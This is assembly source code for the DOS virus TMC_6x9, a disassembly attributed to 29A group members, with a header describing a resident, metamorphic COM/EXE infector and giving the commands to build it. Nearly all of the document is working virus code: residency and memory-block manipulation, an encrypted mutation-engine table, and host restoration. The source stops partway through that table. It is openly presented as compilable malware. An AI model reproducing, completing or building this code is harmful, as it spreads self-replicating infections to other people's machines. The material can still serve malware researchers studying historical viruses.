comment *
                                TMC_6x9                млллллм млллллм млллллм
                             Disassembly by            ллл ллл ллл ллл ллл ллл
                        Super/29A and Darkman/29A       мммллп плллллл ллллллл
                                                       лллмммм ммммллл ллл ллл
                                                       ллллллл ллллллп ллл ллл

  TMC_6x9 is a 5393 bytes resident appending COM and EXE virus. Infects at
  open file, close file and load and/or execute program. TMC_6x9 has an error
  handler, retro structures and is metamorphic in file and memory using Tiny
  Mutation Compiler v 1.00 [TMC].

  To compile TMC_6x9 with Turbo Assembler v 5.0 type:
    TASM /M TMC_6X9.ASM
    TLINK /x TMC_6X9.OBJ
    EXE2BIN TMC_6X9.EXE TMC_6X9.COM
*

.model tiny
.code

code_begin:
             db      10001101b,00101110b ; LEA BP,[imm16] (opcode 8dh,2eh)
             dw      100h                ; Delta offset

             cld                         ; Clear direction flag
             mov     ax,ds               ; AX = segment of PSP for current ...
             mov     [bp+program_seg],ax ; Store segment of PSP for current...

             dec     ax                  ; AX = segment of current Memory C...
             mov     ds,ax               ; DS = segment of current Memory C...
             mov     ax,ds:[03h]         ; AX = size of memory block in par...

             cmp     ax,1900h            ; Insufficient memory?
             jae     resize_mem          ; Above or equal? Jump to resize_mem

             jmp     terminate
resize_mem:
             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)

             mov     [bp+mcb_size_],ax   ; Store size of memory block in p...

             mov     bx,[bp+new_mcb_size]
             mov     ah,4ah              ; Resize memory block
             int     21h
             jnc     allocate_mem        ; No error? Jump to allocate_mem

             jmp     terminate
allocate_mem:
             mov     ah,48h              ; Allocate memory

             mov     bx,[bp+mcb_size_]   ; BX = size of memory block in par...
             sub     bx,[bp+new_mcb_size]
             dec     bx                  ; BX = number of paragraphs to all...
             cmp     bx,267h             ; Insufficient memory?
             jae     allocat_mem         ; Above or equal? Jump to allocat_mem

             jmp     terminate
allocat_mem:
             int     21h
             jnc     initiali_tmc        ; No error? Jump to initiali_tmc

             jmp     terminate
initiali_tmc:
             mov     es,ax               ; ES = segment of allocated memory
             add     es:[02h],6942h      ; Store 16-bit random number
             mov     word ptr es:[0ch],00h
             mov     es:[04h],118h       ; Store offset of block information
             mov     es:[06h],2c8h       ; Store offset of CALL; JMP; Jcc i...
             mov     es:[08h],5a8h       ; Store offset of data information

             lea     si,[bp+tmc_table]   ; SI = offset of tmc_table

             push    si                  ; Save SI at stack

             mov     bx,730h             ; BX = offset of next virus genera...

             jmp     initial_tmc
initial_tmc:
             mov     di,10h              ; DI = offset of table of blocks
             xor     ax,ax               ; Zero AX

             jmp     tmc_ini_loop
tmc_ini_loop:
             add     si,ax               ; SI = offset of block or instruct...
             call    decrypt_byte
             or      al,al               ; End of table?
             jz      calc_blocks         ; Zero? Jump to calc_blocks
             nop
             nop
             nop
             
             cmp     al,11101000b        ; CALL; JMP; Data reference; Jcc?
             jae     exam_block          ; Above or equal? Jump to exam_block
             nop
             nop
             nop

             cmp     al,10h              ; Data?
             jbe     tmc_ini_loop        ; Below or equal? Jump to tmc_ini_...
             nop
             nop
             nop

             sub     al,10h              ; AL = length of data

             jmp     tmc_ini_loop
exam_block:
             cmp     al,11101111b        ; End of block?
             jne     exam_block_         ; Not equal? Jump to exam_block_
             nop
             nop
             nop

             mov     al,00h              ; Don't add anything to offset wit...

             jmp     tmc_ini_loop
exam_block_:
             cmp     al,11101110b        ; Beginning of block?
             jne     next_byte           ; Not equal? Jump to next_byte
             nop
             nop
             nop

             mov     ax,si               ; AX = offset of block identification
             dec     ax                  ; AX = offset of block within table
             stosw                       ; Store offset of block within table

             mov     ax,0ffffh           ; Block is still in one part
             stosw                       ; Store block identification

             mov     ax,02h              ; Add two to offset within table

             jmp     tmc_ini_loop
next_byte:
             mov     al,02h              ; Add two to offset within table

             jmp     tmc_ini_loop
calc_blocks:
             lea     ax,[di-10h]         ; AX = number of blocks multiplied...
             shr     ax,01h              ; Divide number of blocks by two
             shr     ax,01h              ; Divide number of blocks by two
             mov     es:[0ah],ax         ; Store number of blocks

             xor     ax,ax               ; End of table
             stosw                       ; Store end of table

             mov     di,10h              ; DI = offset of table of blocks
             mov     si,es:[di]          ; SI = offset of block within table

             jmp     exam_bloc
split_block:
             push    bp                  ; Save BP at stack
             mov     bp,es:[0ah]         ; BP = number of blocks
             call    rnd_in_range
             pop     bp                  ; Load BP from stack

             shl     ax,01h              ; Multiply random number with two
             shl     ax,01h              ; Multiply random number with two
             add     ax,10h              ; Add ten to random number

             mov     di,ax               ; DI = random offset within table

             jmp     exam_nxt_blo
exam_nxt_blo:
             add     di,04h              ; DI = offset of next offset withi...

             mov     si,es:[di]          ; SI = offset of next block within...
             or      si,si               ; End of table?
             jnz     exam_block__        ; Not zero? Jump to exam_block__
             nop
             nop
             nop

             mov     di,10h              ; DI = offset of table of blocks
             mov     si,es:[di]          ; SI = offset of block within table

             jmp     exam_block__
exam_block__:
             push    ax                  ; Save AX at stack
             call    decrypt_byte
             dec     si                  ; Decrease offset of block within ...
             cmp     al,11101111b        ; End of block?
             pop     ax                  ; Load AX from stack
             jne     exam_bloc           ; Not equal? Jump to exam_bloc
             nop
             nop
             nop

             cmp     di,ax               ; End of table of blocks?
             jne     exam_nxt_blo        ; Not equal? Jump to exam_nxt_blo
             nop
             nop
             nop

             jmp     exam_tbl_inf
exam_bloc:
             mov     ax,es:[di+02h]      ; AX = block information

             cmp     ax,0ffffh           ; Block is still in one part?
             je      exam_bloc_          ; Equal? Jump to exam_bloc_
             nop
             nop
             nop

             push    di                  ; Save DI at stack
             mov     di,ax               ; DI = offset of end of first part...
             mov     al,11101001b        ; JMP imm16 (opcode 0e9h)
             stosb                       ; Store JMP imm16

             mov     ax,bx               ; AX = offset within next virus ge...
             dec     ax                  ; Decrease offset within next viru...
             dec     ax                  ; Decrease offset within next viru...
             sub     ax,di               ; Subtract offset of end of first ...
             stosw                       ; Store 16-bit immediate
             pop     di                  ; Load DI from stack

             jmp     exam_bloc_
exam_bloc_:
             call    decrypt_byte

             cmp     al,11101111b        ; End of block?
             jne     exam_bloc__         ; Not equal? Jump to exam_bloc__
             
             jmp     end_of_block
exam_bloc__:
             cmp     al,10h              ; Data; CALL; JMP; Data reference...?
             ja      exam_bloc___        ; Above? Jump to exam_bloc___
             nop
             nop
             nop

             push    ax bp               ; Save registers at stack
             mov     bp,[bp+probability] ; BP = probability
             call    rnd_in_range
             or      ax,ax               ; Split up block?
             pop     bp ax               ; Load registers from  stack
             jz      split_block         ; Zero? Jump to split_block
             nop
             nop
             nop

             jmp     exam_bloc___
exam_bloc___:
             cmp     al,11101111b        ; End of block?
             jne     exam_blo            ; Not equal? Jump to exam_blo
             
             jmp     end_of_block
exam_blo:
             cmp     al,11101000b        ; CALL; JMP; Data reference; Jcc?
             jae     exam_data           ; Above or equal? Jump to exam_data
             nop
             nop
             nop

             cmp     al,10h              ; Data?
             jbe     sto_instruct        ; Below or equal? Jump to sto_inst...
             nop
             nop
             nop

             sub     al,10h              ; AL = length of data

             jmp     sto_instruct
sto_instruct:
             xor     cx,cx               ; Zero CX
             mov     cl,al               ; CL = length of instruction

             push    di                  ; Save DI at stack
             mov     di,bx               ; DI = offset within next virus ge...

             jmp     sto_ins_loop
sto_ins_loop:
             call    decrypt_byte
             stosb                       ; Store byte of instruction

             dec     cx                  ; Decrease counter
             jnz     sto_ins_loop        ; Not zero? Jump to sto_ins_loop
             nop
             nop
             nop

             mov     bx,di               ; BX = offset within next virus ge...
             pop     di                  ; Load DI from stack

             jmp     exam_bloc_
exam_data:
             cmp     al,11101101b        ; Data reference?
             jne     exam_blo_           ; Not equal? Jump to exam_blo_
             nop
             nop
             nop

             push    di                  ; Load DI from stack
             mov     di,es:[08h]         ; DI = offset within data information

             mov     ax,bx               ; AX = offset within next virus ge...
             dec     ax                  ; Decrease offset within next viru...
             dec     ax                  ; Decrease offset within next viru...
             stosw                       ; Store offset within next virus g...

             call    decrypt_id
             stosw                       ; Store block identification

             mov     es:[08h],di         ; Store offset within data informa...
             pop     di                  ; Load DI from stack

             jmp     exam_bloc_
exam_blo_:
             cmp     al,11101110b        ; Beginning of block?
             jne     sto_call_jmp        ; Not equal? Jump to sto_call_jmp
             nop
             nop
             nop

             push    di                  ; Save DI at stack
             mov     di,es:[04h]         ; DI = offset within block informa...

             mov     ax,bx               ; AX = offset within next virus ge...
             stosw                       ; Store offset within next virus g...

             call    decrypt_id
             stosw                       ; Store block identification

             mov     es:[04h],di         ; Store offset within block inform...

             cmp     ax,4c5h             ; Block identification of tmc_table_?
             jne     exam_message        ; Not equal? Jump to exam_message
             nop
             nop
             nop

             push    si                  ; Save SI at stack
             mov     di,bx               ; DI = offset within next virus ge...
             lea     si,[bp+tmc_table]   ; SI = offset of tmc_table
             mov     cx,(table_end-table_begin)
             rep     movsb               ; Move table to top of memory

             mov     bx,di               ; BX = offset within next virus ge...
             pop     si                  ; Load SI from stack

             jmp     examine_next
exam_message:
             cmp     ax,2328h            ; Block identification of message?
             jne     exam_probabi        ; Not equal? Jump to exam_probabi
             nop
             nop
             nop

             mov     ax,14h              ; Probability of including message
             cmp     [bp+probability],ax ; Include message?
             jae     examine_next        ; Above or equal? Jump to examine_...
             nop
             nop
             nop

             call    decrypt_byte
             sub     al,10h              ; AL = length of message
             mov     ah,00h              ; Zero AH
             add     si,ax               ; SI = offset of end of message

             jmp     examine_next
exam_probabi:
             cmp     ax,0bech            ; Block identification of probabi...?
             jne     examine_next        ; Not equal? Jump to examine_next
             nop
             nop
             nop

             mov     ax,[bp+probability] ; AX = probability
             dec     ax                  ; Decrease probability
             cmp     ax,05h              ; Probability too small?
             jae     store_probab        ; Above or equal? Jump to store_pr...
             nop
             nop
             nop

             mov     ax,64h              ; Reset probability

             jmp     store_probab
store_probab:
             mov     es:[bx],ax          ; Store probability

             add     bx,02h              ; Add two to offset within next vi...
             add     si,03h              ; SI = offset of beginning of next...

             jmp     examine_next
examine_next:
             pop     di                  ; Load DI from stack

             call    decrypt_byte

             jmp     exam_bloc___
sto_call_jmp:
             push    ax di               ; Save registers at stack
             mov     di,es:[06h]         ; DI = offset within CALL; JMP; Jc...
             mov     ax,bx               ; AX = offset within next virus ge...
             stosw                       ; Store offset within next virus g...

             call    decrypt_id
             stosw                       ; Store block identification

             mov     es:[06h],di         ; Store offset within CALL; JMP; J...
             pop     di ax               ; Load registers from  stack

             mov     es:[bx],al          ; Store CALL imm16; JMP imm16; Jcc...

             add     bx,03h              ; Add three to offset within next ...

             cmp     al,11110000b        ; Jump condition?
             jae     jcc_imm8            ; Above or equal? Jump to jcc_imm8

             jmp     exam_bloc_
jcc_imm8:
             inc     bx                  ; Increase offset within next viru...
             inc     bx                  ; Increase offset within next viru...

             jmp     exam_bloc_
split_block_:
             mov     es:[di+02h],bx      ; Store offset within next virus g...

             add     bx,03h              ; Add three to offset within next ...

             jmp     end_of_block
end_of_block:
             dec     si                  ; Decrease offset of block within ...

             mov     es:[di],si          ; Store offset of block within table

             jmp     split_block
exam_tbl_inf:
             cmp     word ptr es:[0ch],00h
             jne     correct_i16         ; End of second table? Jump to cor...
             nop
             nop
             nop

             pop     si                  ; Load SI from stack

             mov     es:[0ch],bx         ; Store offset within next virus g...

             add     si,(second_table-first_table)

             jmp     initial_tmc
correct_i16:
             push    es                  ; Save ES at stack
             pop     ds                  ; Load DS from stack (ES)

             sub     bx,730h             ; Subtract offset of next virus ge...
             mov     ds:[0eh],bx         ; Store length of virus

             mov     si,2c8h             ; SI = offset of CALL; JMP; Jcc im...
             mov     cx,ds:[06h]         ; CX = offset of end of CALL; JMP;...
             sub     cx,si               ; Subtract offset of CALL; JMP; Jc...

             shr     cx,01h              ; Divide number of CALL imm16; JMP...
             shr     cx,01h              ; Divide number of CALL imm16; JMP...

             jmp     jmp_call_loo
jmp_call_loo:
             lodsw                       ; AX = offset of block within data...
             push    ax                  ; Save AX at stack

             lodsw                       ; AX = offset of block within data...

             push    cx si               ; Save registers at stack
             mov     si,118h             ; SI = offset of block information
             mov     cx,ds:[04h]         ; CX = offset of end of block info...
             sub     cx,si               ; Subtract offset of block informa...

             shr     cx,01h              ; Divide number of block by two
             shr     cx,01h              ; Divide number of block by two

             jmp     find_block
find_block:
             cmp     ax,[si+02h]         ; Found block?
             je      found_block         ; Equal? Jump to found_block
             nop
             nop
             nop

             add     si,04h              ; SI = offset of next block in table

             dec     cx                  ; Decrease counter
             jnz     find_block          ; Not zero? Jump to find_block
             nop
             nop
             nop
found_block:
             mov     dx,[si]             ; DX = offset of block

             pop     si cx               ; Load registers from  stack
             pop     bx                  ; Load BX from stack (AX)

             mov     al,[bx]             ; AL = first byte of instruction
             cmp     al,11110000b        ; Jump condition?
             jb      sto_call_jm         ; Below? Jump to sto_call_jm
             nop
             nop
             nop

             sub     byte ptr [bx],10000000b
             
             inc     bx                  ; BX = offset of 8-bit immediate

             push    dx                  ; Save DX at stack
             sub     dx,bx               ; Subtract offset within next viru...
             dec     dx                  ; Decrease 8-bit immediate

             cmp     dx,7fh              ; 8-bit immediate out of range?
             jg      invert_jcc          ; Greater? Jump to invert_jcc
             nop
             nop
             nop

             cmp     dx,0ff80h           ; 8-bit immediate out of range?
             jl      invert_jcc          ; Less? Jump to invert_jcc
             nop
             nop
             nop

             mov     [bx],dl             ; Store 8-bit immediate
             inc     bx                  ; BX = offset of end of Jcc imm8

             mov     [bx],1001000010010000b
             mov     byte ptr [bx+02h],10010000b
             pop     dx                  ; Load DX from stack

             jmp     correct_i16_
invert_jcc:
             pop     dx                  ; Load DX from stack

             dec     bx                  ; BX = offset of Jcc imm8
             xor     byte ptr [bx],00000001b

             inc     bx                  ; BX = offset of 8-bit immediate
             mov     byte ptr [bx],03h   ; Store 8-bit immediate

             inc     bx                  ; BX = offset of JMP imm16
             mov     al,11101001b        ; JMP imm16 (opcode 0e9h)

             jmp     sto_call_jm
sto_call_jm:
             mov     [bx],al             ; Store CALL imm16; JMP imm16

             inc     bx                  ; BX = offset of 16-bit immediate
             sub     dx,bx               ; Subtract offset within next viru...

             dec     dx                  ; Decrease 16-bit immediate
             dec     dx                  ; Decrease 16-bit immediate

             mov     [bx],dx             ; Store 16-bit immediate

             jmp     correct_i16_
correct_i16_:
             dec     cx                  ; Decrease counter
             jnz     jmp_call_loo        ; Not zero? Jump to jmp_call_loo
             nop
             nop
             nop

             mov     si,5a8h             ; SI = offset of data information
             mov     cx,ds:[08h]         ; CX = offset of end of data infor...
             sub     cx,si               ; Subtract offset of data informat...

             shr     cx,01h              ; Divide number of data references...
             shr     cx,01h              ; Divide number of data references...

             jmp     data_ref_loo
data_ref_loo:
             lodsw                       ; AX = offset of block within data...
             push    ax                  ; Save AX at stack

             lodsw                       ; AX = offset of block within data...

             push    cx si               ; Save registers at stack
             mov     si,118h             ; SI = offset of block information
             mov     cx,ds:[04h]         ; CX = offset of end of block info...
             sub     cx,si               ; Subtract offset of block informa...

             shr     cx,01h              ; Divide number of block by two
             shr     cx,01h              ; Divide number of block by two

             jmp     find_block_
find_block_:
             cmp     ax,[si+02h]         ; Found block?
             je      found_block_        ; Equal? Jump to found_block_
             nop
             nop
             nop

             add     si,04h              ; SI = offset of next block in table

             dec     cx                  ; Decrease counter
             jnz     find_block_         ; Not zero? Jump to find_block_
             nop
             nop
             nop
found_block_:
             mov     ax,[si]             ; AX = offset of block
             pop     si cx               ; Load registers from  stack
             pop     bx                  ; Load BX from stack (AX)

             sub     ax,730h             ; Subtract offset of next virus ge...
             mov     [bx],ax             ; Store 16-bit immediate

             dec     cx                  ; Decrease counter
             jnz     data_ref_loo        ; Not zero? Jump to data_ref_loo
             nop
             nop
             nop

             jmp     restore_code
restore_code:
             mov     ax,[bp+program_seg] ; AX = segment of PSP for current ...

             mov     cx,[bp+initial_ss]  ; CX = initial SS relative to star...
             add     cx,10h              ; Add ten to initial SS relative t...
             add     cx,ax               ; Add segment of PSP for current p...
             push    cx                  ; Save CX at stack

             push    [bp+initial_sp]     ; Save initial SP at stack

             mov     cx,[bp+initial_cs]  ; CX = initial CS relative to star...
             add     cx,10h              ; Add ten to initial CS relative t...
             add     cx,ax               ; Add segment of PSP for current p...
             push    cx                  ; Save CX at stack

             push    [bp+initial_ip]     ; Save initial IP at stack

             push    ax                  ; Save segment of PSP for current ...
             push    [bp+mcb_size]       ; Save size of memory block in par...
             push    ds                  ; Save DS at stack

             mov     cl,00h              ; COM executable
             cmp     [bp+executa_stat],cl
             jne     move_virus          ; COM executable? Jump to move_virus
             nop
             nop
             nop

             lea     si,[bp+origin_code] ; SI = offset of origin_code

             mov     ax,cs:[si]          ; AX = first two bytes of original...
             mov     cs:[100h],ax        ; Store first two bytes of origina...

             mov     al,cs:[si+02h]      ; AL = last byte of original code ...
             mov     cs:[100h+02h],al    ; Store last byte of original code...

             jmp     move_virus

             mov     ax,[bp+program_seg] ; AX = segment of PSP for current ...

             mov     cx,[bp+initial_ss]  ; CX = initial SS relative to star...
             add     cx,10h              ; Add ten to initial SS relative t...
             add     cx,ax               ; Add segment of PSP for current p...
             push    cx                  ; Save CX at stack

             push    [bp+initial_sp]     ; Save initial SP at stack

             mov     cx,[bp+initial_cs]  ; CX = initial CS relative to star...
             add     cx,10h              ; Add ten to initial CS relative t...
             add     cx,ax               ; Add segment of PSP for current p...
             push    cx                  ; Save CX at stack

             push    [bp+incorrect_ip]   ; Save incorrect IP at stack

             push    ax                  ; Save segment of PSP for current ...
             push    [bp+mcb_size]       ; Save size of memory block in par...
             push    ds                  ; Save DS at stack

             mov     cl,00h              ; COM executable
             cmp     [bp+executa_stat],cl
             jne     move_virus          ; COM executable? Jump to move_virus
             nop
             nop
             nop

             lea     si,[bp+incorr_code] ; SI = offset of incorr_code

             mov     ax,cs:[si]          ; AX = first two bytes of incorrec...
             mov     cs:[100h],ax        ; Store first two bytes of incorre...

             mov     al,cs:[si+02h]      ; AL = last byte of incorrect code
             mov     cs:[100h+02h],al    ; Store last byte of incorrect code

             jmp     move_virus
move_virus:
             xor     ax,ax               ; Zero AX
             mov     ds,ax               ; DS = segment of DOS communicatio...

             cmp     byte ptr ds:[501h],10h
             jne     move_virus_         ; Already resident? Jump to move_v...

             jmp     virus_exit
move_virus_:
             mov     byte ptr ds:[501h],10h

             push    es                  ; Save ES at stack
             pop     ds                  ; Load DS from stack (ES)

             mov     ax,ds:[0ch]         ; AX = offset within next virus ge...
             sub     ax,730h             ; Subtract offset of next virus ge...
             mov     [bp+vir_exit_off],ax

             mov     cx,ds:[0eh]         ; CX = length of virus
             mov     [bp+virus_length],cx

             mov     si,730h             ; SI = offset of next virus genera...
             xor     di,di               ; Zero DI
             rep     movsb               ; Move virus to top of memory

             mov     cl,04h              ; Divide by paragraphs
             shr     di,cl               ; DI = length of next virus genera...
             inc     di                  ; Increase length of next virus ge...

             mov     bx,[bp+mcb_size_]   ; BX = size of memory block in par...
             sub     bx,[bp+new_mcb_size]
             sub     bx,di               ; Subtract length of next virus ge...

             dec     bx                  ; Decrease new size in paragraphs
             dec     bx                  ; Decrease new size in paragraphs

             cmp     bx,di               ; Insufficient memory?
             jae     resize_mem_         ; Above or equal? Jump to resize_mem_

             jmp     virus_exit
resize_mem_:
             mov     ah,4ah              ; Resize memory block
             int     21h
             jnc     allocat_mem_        ; No error? Jump to allocat_mem_

             jmp     virus_exit
allocat_mem_:
             mov     bx,di               ; BX = number of paragraphs to all...
             mov     ah,48h              ; Allocate memory
             int     21h
             jc      virus_exit          ; Error? Jump to virus_exit
             nop
             nop
             nop

             dec     ax                  ; AX = segment of current Memory C...
             mov     es,ax               ; ES = segment of current Memory C...
             mov     word ptr es:[01h],08h

             inc     ax                  ; AX = segment of PSP for current ...
             mov     es,ax               ; AX = segment of PSP for current ...

             mov     cx,[bp+virus_length]
             xor     si,si               ; Zero SI
             xor     di,di               ; Zero DI
             rep     movsb               ; Move virus to top of memory

             push    es                  ; Save ES at stack
             push    word ptr [bp+vir_exit_off]

             mov     al,[bp+crypt_key]   ; AL = 8-bit encryption/decryption...
             mov     ah,byte ptr [bp+sliding_key]

             retf                        ; Return far
terminate:
             mov     ax,4c00h            ; Terminate with return code
             int     21h

get_rnd_num  proc    near                ; Get 16-bit random number
             push    cx                  ; Save CX at stack
             in      al,40h              ; AL = 8-bit random number
             mov     ah,al               ; AH = 8-bit random number
             in      al,40h              ; AL = 8-bit random number

             xor     ax,es:[02h]         ; AX = 16-bit random number

             mov     cl,ah               ; CL = high-order byte of 16-bit r...
             rol     ax,cl               ; AX = 16-bit random number

             mov     es:[02h],ax         ; Store 16-bit random number
             pop     cx                  ; Load CX from stack

             ret                         ; Return
             endp

rnd_in_range proc    near                ; Random number within range
             or      bp,bp               ; Zero BP?
             jz      zero_range          ; Zero? Jump to zero_range
             nop
             nop
             nop

             push    dx                  ; Save DX at stack
             call    get_rnd_num

             xor     dx,dx               ; Zero DX
             div     bp                  ; DX = random number within range

             xchg    ax,dx               ; AX = random number within range
             pop     dx                  ; Load DX from stack

             ret                         ; Return
zero_range:
             xor     ax,ax               ; AX = random number within range

             ret                         ; Return
             endp

decrypt_byte proc    near                ; Decrypt byte of table
             mov     [bp+ah_],ah         ; Store AH

             mov     ax,si               ; AX = offset within table
             sub     ax,bp               ; Subtract delta offset from offse...
             sub     ax,offset tmc_table ; Subtract offset of tmc_table fro...

             mul     word ptr [bp+sliding_key]
             add     al,[bp+crypt_key]   ; AL = 8-bit encryption/decryption...

             xor     al,[si]             ; AL = byte of decrypted table

             mov     ah,[bp+ah_]         ; AH = stored AH

             inc     si                  ; Increase offset within table

             ret                         ; Return
             endp

decrypt_id   proc    near                ; Decrypt block identification in ...
             call    decrypt_byte
             mov     ah,al               ; AL = byte of decrypted table

             call    decrypt_byte
             xchg    al,ah               ; AL = byte of decrypted table

             ret                         ; Return
             endp
virus_exit:
             pop     es                  ; Load ES from stack

             mov     ah,49h              ; Free memory
             int     21h
             pop     bx                  ; Load BX from stack

             pop     ax                  ; Load AX from stack
             mov     ds,ax               ; DS = segment of PSP for current ...
             mov     es,ax               ; DS = segment of PSP for current ...

             mov     ah,4ah              ; Resize memory block
             int     21h

             lea     bx,[bp+jmp_imm32]   ; BX = offset of jmp_imm32

             pop     ax                  ; Load AX from stack (initial IP)
             mov     cs:[bx+01h],ax      ; Store initial IP

             pop     ax                  ; Load AX from stack (initial CS ...)
             mov     cs:[bx+03h],ax      ; Store initial CS relative to sta...

             pop     ax                  ; Load AX from stack (initial SP)
             pop     ss                  ; Load SS from stack (initial SS ...)

             mov     sp,ax               ; SP = stack pointer

             jmp     jmp_imm32

jmp_imm32    equ     $                   ; Offset of JMP imm32 (opcode 0eah)
             db      11101010b           ; JMP imm32 (opcode 0eah)
             dd      00h                 ; Pointer to virus in top of memory
ah_          db      00h                 ; Accumulator register (high-orde...)
probability  dw      32h                 ; Probability
crypt_key    db      00h                 ; 8-bit encryption/decryption key
sliding_key  dw      00h                 ; 8-bit sliding encryption/decrypt...
executa_stat db      00h                 ; Executable status
origin_code  db      11000011b,02h dup(00h)
incorr_code  db      11000011b,02h dup(00h)
initial_cs   dw      0fff0h              ; Initial CS relative to start of ...
initial_ss   dw      0fff0h              ; Initial SS relative to start of ...
initial_ip   dw      100h                ; Initial IP
incorrect_ip dw      100h                ; Incorrect IP
initial_sp   dw      0fffeh              ; Initial SP
new_mcb_size dw      1000h               ; New size in paragraphs
mcb_size     dw      0ffffh              ; Size of memory block in paragraphs
mcb_size_    dw      00h                 ; Size of memory block in paragraphs
program_seg  dw      00h                 ; Segment of PSP for current process
virus_length dw      00h                 ; Length of virus
vir_exit_off dw      00h                 ; Offset of virus_exit
table_begin:
first_table:
tmc_table    db      11101111b           ; End of block
             db      11101110b           ; Beginning of block
             dw      00h                 ; Block identification of tmc_table
             db      04h                 ; Four bytes instruction

             db      10001101b,00101110b ; LEA BP,[imm16] (opcode 8dh,2eh)
             dw      1234h               ; Delta offset

             db      01h                 ; One byte instruction

             cld                         ; Clear direction flag

             db      02h                 ; Two bytes instruction

             mov     ax,ds               ; AX = segment of PSP for current ...

             db      04h                 ; Four bytes instruction

             mov     [bp+1234h],ax       ; Store segment of PSP for current...

             db      11101101b           ; Data reference
             dw      0befh               ; Pointer to program_seg_
             db      01h                 ; One byte instruction

             dec     ax                  ; AX = segment of current Memory C...

             db      02h                 ; Two bytes instruction

             mov     ds,ax               ; DS = segment of current Memory C...

             db      03h                 ; Three bytes instruction

             mov     ax,ds:[03h]         ; AX = size of memory block in par...

             db      03h                 ; Three bytes instruction

             cmp     ax,1900h            ; Insufficient memory?

             db      01110010b+10000000b ; Below? Jump to terminate_
             dw      0beeh               ; Pointer to terminate_
             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (CS)

             db      04h                 ; Four bytes instruction

             mov     [bp+1234h],ax       ; Store size of memory block in p...

             db      11101101b           ; Data reference
             dw      1394h               ; Pointer to mcb_size___
             db      04h                 ; Four bytes instruction

             mov     bx,[bp+1234h]       ; BX = new size in paragraphs

             db      11101101b           ; Data reference
             dw      1393h               ; Pointer to new_mcb_siz
             db      02h                 ; Two bytes instruction

             mov     ah,4ah              ; Resize memory block

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to terminate_
             dw      0beeh               ; Pointer to terminate_
             db      02h                 ; Two bytes instruction

             mov     ah,48h              ; Allocate memory

             db      04h                 ; Four bytes instruction

             mov     bx,[bp+1234h]       ; BX = size of memory block in par...

             db      11101101b           ; Data reference
             dw      1394h               ; Pointer to mcb_size___
             db      04h                 ; Four bytes instruction

             sub     bx,[bp+1234h]       ; Subtract new size in paragraphs ...

             db      11101101b           ; Data reference
             dw      1393h               ; Pointer to new_mcb_siz
             db      01h                 ; One byte instruction

             dec     bx                  ; BX = number of paragraphs to all...

             db      04h                 ; Four bytes instruction

             cmp     bx,267h             ; Insufficient memory?

             db      01110010b+10000000b ; Below? Jump to terminate_
             dw      0beeh               ; Pointer to terminate_
             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to terminate_
             dw      0beeh               ; Pointer to terminate_
             db      02h                 ; Two bytes instruction

             mov     es,ax               ; ES = segment of allocated memory

             db      07h                 ; Seven bytes instruction

             add     es:[02h],6942h      ; Store 16-bit random number

             db      07h                 ; Seven bytes instruction

             mov     word ptr es:[0ch],00h

             db      07h                 ; Seven bytes instruction

             mov     es:[04h],118h       ; Store offset of block information

             db      07h                 ; Seven bytes instruction

             mov     es:[06h],2c8h       ; Store offset of CALL; JMP; Jcc i...

             db      07h                 ; Seven bytes instruction

             mov     es:[08h],5a8h       ; Store offset of data information

             db      04h                 ; Four bytes instruction

             lea     si,[bp+1234h]       ; SI = offset of tmc_table_

             db      11101101b           ; Data reference
             dw      4c5h                ; Pointer to tmc_table_
             db      01h                 ; One byte instruction

             push    si                  ; Save SI at stack

             db      03h                 ; Three bytes instruction

             mov     bx,730h             ; BX = offset of next virus genera...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0fa0h               ; Pointer to initial_tmc
             db      11101111b           ; End of block
initial_tmc_ db      11101110b           ; Beginning of block
             dw      0fa0h               ; Block identification of initial_...
             db      03h                 ; Three bytes instruction

             mov     di,10h              ; DI = offset of table of blocks

             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero AX

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      11101111b           ; End of block
tmc_ini_loo  db      11101110b           ; Beginning of block
             dw      0bb8h               ; Block identification of tmc_ini_loo
             db      02h                 ; Two bytes instruction

             add     si,ax               ; SI = offset of block or instruct...

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      02h                 ; Two bytes instruction

             or      al,al               ; End of table?

             db      01110100b+10000000b ; Zero? Jump to calc_blocks_
             dw      0bbch               ; Pointer to calc_blocks_
             db      02h                 ; Two bytes instruction

             cmp     al,11101000b        ; CALL; JMP; Data reference; Jcc?

             db      01110011b+10000000b ; Above or equal? Jump to exam_blo__
             dw      0bb9h               ; Pointer to exam_blo__
             db      02h                 ; Two bytes instruction

             cmp     al,10h              ; Data?

             db      01110110b+10000000b ; Below or equal? Jump to tmc_ini_...
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      02h                 ; Two bytes instruction

             sub     al,10h              ; AL = length of data

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      11101111b           ; End of block
exam_blo__   db      11101110b           ; Beginning of block
             dw      0bb9h               ; Block identification of exam_blo__
             db      02h                 ; Two bytes instruction

             cmp     al,11101111b        ; End of block?

             db      01110101b+10000000b ; Not equal? Jump to exam_blo___
             dw      0bbah               ; Pointer to exam_blo___
             db      02h                 ; Two bytes instruction

             mov     al,00h              ; Don't add anything to offset wit...

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bb8h               ; Pointer to tmc_ini_loo
             db      11101111b           ; End of block
exam_blo___  db      11101110b           ; Beginning of block
             dw      0bbah               ; Block identification of exam_blo___
             db      02h                 ; Two bytes instruction

             cmp     al,11101110b        ; Beginning of block?

             db      01110101b+10000000b ; Not equal? Jump to next_byte_
             dw      0bbbh               ; Pointer to next_byte_
             db      02h                 ; Two bytes instruction

             mov     ax,si               ; AX = offset of block identification

             db      01h                 ; One byte instruction

             dec     ax                  ; AX = offset of block within table

             db      01h                 ; One byte instruction

             stosw                       ; Store offset of block within table

             db      03h                 ; Three bytes instruction

             mov     ax,0ffffh           ; Block is still in one part

             db      01h                 ; One byte instruction

             stosw                       ; Store block identification

             db      03h                 ; Three bytes instruction

             mov     ax,02h              ; Add two to offset within table

